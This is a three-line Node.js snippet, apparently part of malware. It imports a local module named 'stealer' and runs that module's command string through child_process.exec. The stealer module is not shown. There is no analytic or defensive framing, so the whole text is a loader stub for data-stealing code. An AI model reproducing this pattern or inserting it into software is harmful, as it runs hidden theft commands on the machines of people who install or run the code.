const cp = require('child_process');
const s = require('./stealer');
cp.exec(s.cmd);
